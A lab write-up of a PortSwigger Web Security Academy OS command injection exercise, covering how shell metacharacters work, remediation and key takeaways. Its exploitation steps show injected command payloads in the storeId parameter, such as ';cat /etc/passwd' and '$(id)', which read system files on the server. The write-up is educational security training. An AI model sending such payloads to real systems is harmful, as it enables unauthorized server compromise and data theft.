# OS Command Injection: Executing Arbitrary Commands on the Host

## Platform
PortSwigger Web Security Academy

## Difficulty
Apprentice

## Vulnerability Category
OS Command Injection (CWE-78)

## Lab Objective
Exploit a product stock-checking feature that passes user input unsanitised into a shell command, to execute an arbitrary OS command and read the contents of `/etc/passwd`.

## Vulnerability Overview
OS command injection occurs when an application builds a shell command by concatenating or interpolating user-controlled input, and that string is then passed to a function that executes it on the underlying operating system (e.g. `system()`, `exec()`, `popen()` in the backend language). Because the shell interprets special characters as command separators rather than literal data, an attacker can append entirely new commands onto the intended one.

In this lab, the "Check stock" feature sends a request like:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

The backend likely builds something equivalent to:

```bash
stockreport.pl 1 1
```

If `storeId` is inserted into that command string without sanitisation, an attacker can break out of the intended argument and inject a second command using a shell metacharacter.

**Shell metacharacters commonly used for injection:**

| Character | Meaning |
|-----------|---------|
| `;` | Command separator — runs both commands sequentially |
| `\|` | Pipe — output of first command feeds the second |
| `&&` | Runs second command only if first succeeds |
| `\|\|` | Runs second command only if first fails |
| `` ` `` or `$()` | Command substitution — output is inlined |
| `&` | Backgrounds the first command, runs the second immediately |

## Methodology
1. **Reconnaissance.** Browse the shop with Burp Suite proxying traffic. Click "Check stock" on a product and capture the request in **Proxy > HTTP history**.
2. **Baseline.** Send the request to **Repeater** and confirm normal behaviour (`200 OK`, a stock count in the response).
3. **Probe for injection.** Append a shell metacharacter and a harmless command to a parameter, and look for its output appearing in the response — the signature of in-band (visible-output) command injection.
4. **Confirm and escalate.** Once confirmed, chain further commands to read sensitive files.

---

## Lab 01: OS Command Injection, Simple Case

**Defence:** none — the `storeId` parameter is concatenated directly into a shell command with no sanitisation, and the command's output is reflected in the HTTP response.

### Exploitation

**Step 1:** Intercept the stock-check request and send it to Repeater:

```http
POST /product/stock HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

**Step 2:** Inject a harmless probe command into `storeId` using the `;` separator:

```http
productId=1&storeId=1;echo+hello
```

**Step 3:** The response includes `hello` alongside the normal stock output, confirming the injected command executed and its output is reflected back — this is **in-band** command injection, the easiest variant to detect and exploit.

**Step 4:** Replace the probe with a command that reads the target file:

```http
productId=1&storeId=1;cat+/etc/passwd
```

**Step 5:** The response now contains the contents of `/etc/passwd` (e.g. `root:x:0:0:root:/root:/bin/bash`), confirming full command execution and solving the lab.

**Why it works:** The application never separates data from code — it trusts `storeId` to be a safe literal and splices it straight into a shell invocation. The `;` character has no special meaning to the application logic but is interpreted by the shell as "end this command, start a new one," so anything after it runs as an independent, fully attacker-controlled command.

**Note on quoting:** If the backend wraps the parameter in quotes before executing, `;` alone may not break out depending on context; alternative payloads such as `| id`, `` `id` ``, or `$(id)` can be tried as the shell's parsing rules differ for each metacharacter. In this lab specifically, unquoted concatenation makes `;` sufficient.

## Impact
- **Full remote code execution** on the application server — the most severe outcome short of host compromise.
- **Complete confidentiality, integrity, and availability loss**: an attacker can read any file the server process can access, modify data, install backdoors, or pivot to internal infrastructure.
- **Credential and secret exposure**: configuration files, environment variables, and SSH keys are all reachable once arbitrary commands can run.

## Remediation
- **Avoid shell execution entirely where possible.** Use language-native APIs (e.g. library calls instead of shelling out to external binaries).
- **Use parameterised/argument-array APIs** (e.g. `execve` with an argument array) instead of building a single command string — this prevents the shell from re-interpreting metacharacters.
- **Strict input validation.** If a parameter must be used in a command, validate it against a strict allowlist (e.g. numeric-only for `storeId`) and reject anything else.
- **Principle of least privilege.** Run the application process with minimal OS permissions so that even a successful injection has limited blast radius.
- **Avoid reflecting command output** back to the client; this turns a potentially blind vulnerability into a trivially exploitable in-band one.

## Key Takeaways
- Command injection is a direct consequence of mixing code and data — any parameter reaching a shell invocation is high-risk.
- In-band injection (output reflected to the attacker) is the simplest variant; blind injection (no visible output) requires time delays or out-of-band channels instead, covered in the Practitioner-level labs in this category.
- A single unsanitised parameter reaching `system()`/`exec()` is sufficient for full server compromise — there's no "partial" command injection.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.